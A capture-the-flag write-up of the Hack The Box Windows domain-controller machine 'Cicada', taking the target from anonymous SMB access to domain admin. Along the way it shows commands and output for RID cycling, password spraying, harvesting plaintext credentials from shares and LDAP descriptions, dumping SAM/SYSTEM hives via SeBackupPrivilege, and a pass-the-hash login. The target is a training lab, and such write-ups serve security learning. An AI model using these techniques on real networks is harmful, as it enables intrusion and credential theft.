---
title: "Cicada"
tags:
    - machine
    - smb
date: "2025-02-15"
thumbnail: "/assets/img/thumbnail/Cicada.png"
bookmark: true
---

# Description
---

<img src="/assets/img/thumbnail/Cicada.png" alt="Cicada">

# Solution
---
## Recon
---

Applying nmap scan

```bash
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-01 23:48 SAST
Nmap scan report for 10.10.11.35
Host is up (0.17s latency).

PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-10-02 04:48:19Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
|_ssl-date: TLS randomness does not represent time
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: CICADA-DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-10-02T04:49:02
|_  start_date: N/A
|_clock-skew: 6h59m59s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
```


## shell as michael.wrightson
---

As we have port 445 open, we can enumerate smb and this is a cool <a href="https://0xdf.gitlab.io/cheatsheets/smb-enum">cheatsheet</a> by 0xdf.

Trying to enum smb using null session
```bash
┌──(youssif㉿youssif)-[~/Desktop/HTBMachines/cicada]
└─$ nxc smb 10.10.11.35 -u Guest -p "" --shares
SMB         10.10.11.35     445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.35     445    CICADA-DC        [+] cicada.htb\Guest: 
SMB         10.10.11.35     445    CICADA-DC        [*] Enumerated shares
SMB         10.10.11.35     445    CICADA-DC        Share           Permissions     Remark
SMB         10.10.11.35     445    CICADA-DC        -----           -----------     ------
SMB         10.10.11.35     445    CICADA-DC        ADMIN$                          Remote Admin
SMB         10.10.11.35     445    CICADA-DC        C$                              Default share
SMB         10.10.11.35     445    CICADA-DC        DEV                             
SMB         10.10.11.35     445    CICADA-DC        HR              READ            
SMB         10.10.11.35     445    CICADA-DC        IPC$            READ            Remote IPC
SMB         10.10.11.35     445    CICADA-DC        NETLOGON                        Logon server share                                                                                                
SMB         10.10.11.35     445    CICADA-DC        SYSVOL                          Logon server share
```

We can read HR shares using null session

```bash
┌──(youssif㉿youssif)-[~/Desktop/HTBMachines/cicada]
└─$ smbclient '//10.10.11.35/HR' -N                                            
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Mar 14 14:29:09 2024
  ..                                  D        0  Thu Mar 14 14:21:29 2024
  Notice from HR.txt                  A     1266  Wed Aug 28 19:31:48 2024

                4168447 blocks of size 4096. 257594 blocks available
smb: \> get "Notice from HR.txt"
getting file \Notice from HR.txt of size 1266 as Notice from HR.txt (2.0 KiloBytes/sec) (average 2.0 KiloBytes/sec)
```

Let's read this file

```
Dear new hire!

Welcome to Cicada Corp! We're thrilled to have you join our team. As part of our security protocols, it's essential that you change your default password to something unique and secure.

Your default password is: Cicada$M6Corpb*@Lp#nZp!8

To change your password:

1. Log in to your Cicada Corp account** using the provided username and the default password mentioned above.
2. Once logged in, navigate to your account settings or profile settings section.
3. Look for the option to change your password. This will be labeled as "Change Password".
4. Follow the prompts to create a new password**. Make sure your new password is strong, containing a mix of uppercase letters, lowercase letters, numbers, and special characters.
5. After changing your password, make sure to save your changes.

Remember, your password is a crucial aspect of keeping your account secure. Please do not share your password with anyone, and ensure you use a complex password.

If you encounter any issues or need assistance with changing your password, don't hesitate to reach out to our support team at support@cicada.htb.

Thank you for your attention to this matter, and once again, welcome to the Cicada Corp team!

Best regards,
Cicada Corp
```

We have a default password: `Cicada$M6Corpb*@Lp#nZp!8`
So our plan will be finding users in the domain and try all of them againest this password.

As we have NULL session login (no restriction againest anonymous login), so we will have the ability to do rid cycling to get users.

```bash
┌──(youssif㉿youssif)-[~/Desktop/HTBMachines/cicada]
└─$ nxc smb 10.10.11.35 -u Guest -p '' --rid-brute
SMB         10.10.11.35   445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.35   445    CICADA-DC        [+] cicada.htb\Guest: 
SMB         10.10.11.35   445    CICADA-DC        498: CICADA\Enterprise Read-only Domain Controllers (SidTypeGroup)                                                                                
SMB         10.10.11.35   445    CICADA-DC        500: CICADA\Administrator (SidTypeUser)
SMB         10.10.11.35   445    CICADA-DC        501: CICADA\Guest (SidTypeUser)
SMB         10.10.11.35   445    CICADA-DC        502: CICADA\krbtgt (SidTypeUser)
SMB         10.10.11.35   445    CICADA-DC        512: CICADA\Domain Admins (SidTypeGroup)
SMB         10.10.11.35   445    CICADA-DC        513: CICADA\Domain Users (SidTypeGroup)
SMB         10.10.11.35   445    CICADA-DC        514: CICADA\Domain Guests (SidTypeGroup)
SMB         10.10.11.35   445    CICADA-DC        515: CICADA\Domain Computers (SidTypeGroup)
SMB         10.10.11.35   445    CICADA-DC        516: CICADA\Domain Controllers (SidTypeGroup)
SMB         10.10.11.35   445    CICADA-DC        517: CICADA\Cert Publishers (SidTypeAlias)
SMB         10.10.11.35   445    CICADA-DC        518: CICADA\Schema Admins (SidTypeGroup)
SMB         10.10.11.35   445    CICADA-DC        519: CICADA\Enterprise Admins (SidTypeGroup)
SMB         10.10.11.35   445    CICADA-DC        520: CICADA\Group Policy Creator Owners (SidTypeGroup)                                                                                            
SMB         10.10.11.35   445    CICADA-DC        521: CICADA\Read-only Domain Controllers (SidTypeGroup)                                                                                           
SMB         10.10.11.35   445    CICADA-DC        522: CICADA\Cloneable Domain Controllers (SidTypeGroup)                                                                                           
SMB         10.10.11.35   445    CICADA-DC        525: CICADA\Protected Users (SidTypeGroup)
SMB         10.10.11.35   445    CICADA-DC        526: CICADA\Key Admins (SidTypeGroup)
SMB         10.10.11.35   445    CICADA-DC        527: CICADA\Enterprise Key Admins (SidTypeGroup)                                                                                                  
SMB         10.10.11.35   445    CICADA-DC        553: CICADA\RAS and IAS Servers (SidTypeAlias)
SMB         10.10.11.35   445    CICADA-DC        571: CICADA\Allowed RODC Password Replication Group (SidTypeAlias)                                                                                
SMB         10.10.11.35   445    CICADA-DC        572: CICADA\Denied RODC Password Replication Group (SidTypeAlias)                                                                                 
SMB         10.10.11.35   445    CICADA-DC        1000: CICADA\CICADA-DC$ (SidTypeUser)
SMB         10.10.11.35   445    CICADA-DC        1101: CICADA\DnsAdmins (SidTypeAlias)
SMB         10.10.11.35   445    CICADA-DC        1102: CICADA\DnsUpdateProxy (SidTypeGroup)
SMB         10.10.11.35   445    CICADA-DC        1103: CICADA\Groups (SidTypeGroup)
SMB         10.10.11.35   445    CICADA-DC        1104: CICADA\john.smoulder (SidTypeUser)
SMB         10.10.11.35   445    CICADA-DC        1105: CICADA\sarah.dantelia (SidTypeUser)
SMB         10.10.11.35   445    CICADA-DC        1106: CICADA\michael.wrightson (SidTypeUser)
SMB         10.10.11.35   445    CICADA-DC        1108: CICADA\david.orelious (SidTypeUser)
SMB         10.10.11.35   445    CICADA-DC        1109: CICADA\Dev Support (SidTypeGroup)
SMB         10.10.11.35   445    CICADA-DC        1601: CICADA\emily.oscars (SidTypeUser)
```

We got these users
```
john.smoulder
sarah.dantelia
michael.wrightson
david.orelious
emily.oscars
```

Let's try them againest the password

```bash
┌──(youssif㉿youssif)-[~/Desktop/HTBMachines/cicada]
└─$ nxc smb 10.10.11.35 -u users.txt -p "Cicada\$M6Corpb*@Lp#nZp\!8" --continue-on-success
SMB         10.10.11.35     445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.35     445    CICADA-DC        [-] cicada.htb\john.smoulder:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE
SMB         10.10.11.35     445    CICADA-DC        [-] cicada.htb\sarah.dantelia:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE
SMB         10.10.11.35     445    CICADA-DC        [+] cicada.htb\michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8
SMB         10.10.11.35     445    CICADA-DC        [-] cicada.htb\david.orelious:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE
SMB         10.10.11.35     445    CICADA-DC        [-] cicada.htb\emily.oscars:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE
```


## shell as david.orelious
---

As `michael.wrightson` we don't have access to `DEV` shares also.

```bash
┌──(youssif㉿youssif)-[~/Desktop/HTBMachines/cicada]
└─$ smbclient  '/10.10.11.35/DEV' -U michael.wrightson Cicada\$M6Corpb*@Lp#nZp\!8
Try "help" to get a list of possible commands.
smb: \> ls
NT_STATUS_ACCESS_DENIED listing \*
```

We can make use of it to get more information about the domain.

```bash
──(youssif㉿youssif)-[~/Desktop/HTBMachines/cicada]
└─$ nxc ldap cicada.htb -u michael.wrightson -p 'Cicada$M6Corpb*@Lp#nZp!8' --users
SMB         10.10.11.35   445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
LDAP        10.10.11.35   389    CICADA-DC        [+] cicada.htb\michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8
LDAP        10.10.11.35   389    CICADA-DC        [*] Enumerated 8 domain users: cicada.htb
LDAP        10.10.11.35   389    CICADA-DC        -Username-                    -Last PW Set-       -BadPW- -Description-                                                                           
LDAP        10.10.11.35   389    CICADA-DC        Administrator                 2024-08-26 20:08:03 0       Built-in account for administering the computer/domain                                  
LDAP        10.10.11.35   389    CICADA-DC        Guest                         2024-08-28 17:26:56 0       Built-in account for guest access to the computer/domain                                
LDAP        10.10.11.35   389    CICADA-DC        krbtgt                        2024-03-14 11:14:10 0       Key Distribution Center Service Account                                                 
LDAP        10.10.11.35   389    CICADA-DC        john.smoulder                 2024-03-14 12:17:29 1                                                                                               
LDAP        10.10.11.35   389    CICADA-DC        sarah.dantelia                2024-03-14 12:17:29 1                                                                                               
LDAP        10.10.11.35   389    CICADA-DC        michael.wrightson             2024-03-14 12:17:29 0                                                                                               
LDAP        10.10.11.35   389    CICADA-DC        david.orelious                2024-03-14 12:17:29 2       Just in case I forget my password is aRt$Lp#7t*VQ!3                                     
LDAP        10.10.11.35   389    CICADA-DC        emily.oscars                  2024-08-22 21:20:17 0   
```

We can't get the description of the users using the guest enumeration we did before, so we made use of michael.wrightson to get the missing pieces.
We can find the password of `david.orelious` in his description which is `aRt$Lp#7t*VQ!3`


## shell as emily.oscars
---

With the new creds we got we can access the `DEV` share and get its content.

```bash
┌──(youssif㉿youssif)-[~/Desktop/HTBMachines/cicada]
└─$ smbclient  '//10.10.11.35/DEV' -U david.orelious aRt\$Lp#7t*VQ\!3
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Mar 14 14:31:39 2024
  ..                                  D        0  Thu Mar 14 14:21:29 2024
  Backup_script.ps1                   A      601  Wed Aug 28 19:28:22 2024

                4168447 blocks of size 4096. 257190 blocks available
smb: \> get Backup_script.ps1
getting file \Backup_script.ps1 of size 601 as Backup_script.ps1 (1.4 KiloBytes/sec) (average 1.4 KiloBytes/sec)
```

This is the powershell script we got.

```
$sourceDirectory = "C:\smb"
$destinationDirectory = "D:\Backup"

$username = "emily.oscars"
$password = ConvertTo-SecureString "Q!3@Lp#M6b*7t*Vt" -AsPlainText -Force
$credentials = New-Object System.Management.Automation.PSCredential($username, $password)
$dateStamp = Get-Date -Format "yyyyMMdd_HHmmss"
$backupFileName = "smb_backup_$dateStamp.zip"
$backupFilePath = Join-Path -Path $destinationDirectory -ChildPath $backupFileName
Compress-Archive -Path $sourceDirectory -DestinationPath $backupFilePath
Write-Host "Backup completed successfully. Backup file saved to: $backupFilePath"
```

We have a new credentials `emily.oscars:Q!3@Lp#M6b*7t*Vt` and we can use winrm as this user.

```bash
┌──(youssif㉿youssif)-[~/Desktop/HTBMachines/cicada]
└─$ nxc winrm 10.10.11.35 -u emily.oscars -p "Q\!3@Lp#M6b*7t*Vt" --continue-on-success
WINRM       10.10.11.35     5985   CICADA-DC        [*] Windows Server 2022 Build 20348 (name:CICADA-DC) (domain:cicada.htb)
WINRM       10.10.11.35     5985   CICADA-DC        [+] cicada.htb\emily.oscars:Q!3@Lp#M6b*7t*Vt (Pwn3d!)
```

and now we got the user flag

```bash
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Documents> cd ../Desktop
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Desktop> ls


    Directory: C:\Users\emily.oscars.CICADA\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-ar---         2/14/2025   1:41 PM             34 user.txt
```


## shell as Administrator
---

After more enumeration.

```bash
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Documents> whoami /all

USER INFORMATION
----------------

User Name           SID
=================== =============================================
cicada\emily.oscars S-1-5-21-917908876-1423158569-3159038727-1601


GROUP INFORMATION
-----------------

Group Name                                 Type             SID          Attributes
========================================== ================ ============ ==================================================
Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Backup Operators                   Alias            S-1-5-32-551 Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users            Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Certificate Service DCOM Access    Alias            S-1-5-32-574 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level       Label            S-1-16-12288


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.
```

We got important info that the account we have is member in `BUILTIN\Backup Operators` group and it has the priv `SeBackupPrivilege` enabled.
Being in this group means that the user can back up and restore all files on a computer, regardless of the permissions that protect those files.

One of the most famous ways of to exploit this privilege for privesc is to dump SAM and SYSTEM to extract the Administrator hash from them.

We will save the SAM and SYSTEM files in the smb DEV shares as we have access to it to download the files locally.

```bash
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Desktop> reg save hklm\sam \\10.10.11.35\DEV\SAM
The operation completed successfully.

*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Desktop> reg save hklm\sam \\10.10.11.35\DEV\SYSTEM
The operation completed successfully.
```

Now we can see the files in the shares and can get them locally

```bash
┌──(youssif㉿youssif)-[~/Desktop/HTBMachines/cicada]
└─$ smbclient  '//10.10.11.35/DEV' -U david.orelious aRt\$Lp#7t*VQ\!3                      
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat Feb 15 22:59:36 2025
  ..                                  D        0  Thu Mar 14 14:21:29 2024
  Backup_script.ps1                   A      601  Wed Aug 28 19:28:22 2024
  SAM                                 A    49152  Sat Feb 15 22:59:05 2025
  SYSTEM                              A    49152  Sat Feb 15 22:59:36 2025

                4168447 blocks of size 4096. 256636 blocks available
```

Extracting the Administrator's hash

```bash
┌──(youssif㉿youssif)-[~/Desktop/HTBMachines/cicada]
└─$ impacket-secretsdump -sam SAM -system SYSTEM LOCAL
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Target system bootKey: 0x3c2b033757a49110a9ee680b46e8d620
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b87e7c93a3e8a0ea4a581937016f341:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[-] SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn't have hash information.
[*] Cleaning up... 
```

Now, we can login as admin using evil-winrm and the hash we got.

```bash
┌──(youssif㉿youssif)-[~/Desktop/HTBMachines/cicada]
└─$ evil-winrm -i 10.10.11.35 -u Administrator -H "2b87e7c93a3e8a0ea4a581937016f341"
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine                                                               
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                                                                                 
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> ls ../Desktop


    Directory: C:\Users\Administrator\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-ar---         2/14/2025   1:41 PM             34 root.txt
```

GG !! we got the root flag successfully.
